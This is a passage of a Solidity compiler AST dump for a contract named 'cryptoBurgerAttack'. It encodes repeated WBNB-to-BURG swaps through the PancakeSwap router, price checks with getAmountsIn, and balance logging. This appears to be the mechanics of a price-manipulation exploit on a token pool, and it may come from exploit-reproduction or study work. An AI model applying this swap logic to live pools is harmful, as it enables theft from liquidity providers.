                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "3041:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 287,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3041:133:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 288,
                  "nodeType": "EmitStatement",
                  "src": "3036:138:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e",
                        "id": 290,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3207:45:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_a2db286a9c0937162eb9f5bfcb4dbdf09d016a3051498b47657b8201aed0009c",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token\""
                        },
                        "value": "The required WBNB amount for 19M BURG token"
                      },
                      {
                        "baseExpression": {
                          "id": 291,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "3266:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 293,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 292,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "3279:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "3266:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_a2db286a9c0937162eb9f5bfcb4dbdf09d016a3051498b47657b8201aed0009c",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 289,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "3190:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 294,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3190:101:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 295,
                  "nodeType": "EmitStatement",
                  "src": "3185:106:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 297,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3323:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 302,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3396:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 301,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3388:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 300,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3388:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 303,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3388:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 298,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "3363:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 299,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "3363:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 304,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3363:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 296,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "3306:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 305,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3306:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 306,
                  "nodeType": "EmitStatement",
                  "src": "3301:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 308,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "3429:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 309,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "3435:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 310,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "3443:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 312,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 311,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "3456:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "3443:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 313,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3460:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 318,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3479:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 317,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3471:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 316,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3471:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 319,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3471:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 315,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "3463:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 314,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "3463:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 320,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3463:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 307,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "3422:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 321,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3422:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 322,
                  "nodeType": "ExpressionStatement",
                  "src": "3422:64:0"
                },
                {
                  "expression": {
                    "id": 331,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 323,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "3496:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 328,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "3575:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 329,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "3604:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 325,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "3528:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 324,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "3511:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 326,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "3511:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 327,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "3511:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 330,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "3511:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "3496:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 332,
                  "nodeType": "ExpressionStatement",
                  "src": "3496:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722031737420737761703a20",
                        "id": 334,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3651:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_97d2d7be4771c7d1119ad6ccd2c876a40192c92b7f367f613c37a674be20de5f",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 1st swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 1st swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 335,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "3727:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 337,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 336,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "3740:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "3727:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_97d2d7be4771c7d1119ad6ccd2c876a40192c92b7f367f613c37a674be20de5f",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 1st swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 333,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "3634:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 338,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3634:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 339,
                  "nodeType": "EmitStatement",
                  "src": "3629:123:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 341,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3785:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 346,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3858:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 345,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3850:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 344,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3850:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 347,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3850:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 342,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "3825:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 343,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "3825:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 348,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3825:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 340,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "3768:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 349,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3768:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 350,
                  "nodeType": "EmitStatement",
                  "src": "3763:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 352,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "3891:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 353,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "3897:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 354,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "3905:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 356,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 355,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "3918:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "3905:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 357,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "3922:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 362,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "3941:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 361,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "3933:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 360,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "3933:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 363,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "3933:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 359,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "3925:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 358,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "3925:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 364,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "3925:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 351,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "3884:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 365,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "3884:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 366,
                  "nodeType": "ExpressionStatement",
                  "src": "3884:64:0"
                },
                {
                  "expression": {
                    "id": 375,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 367,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "3958:12:0",
                      "typeDescriptions": {
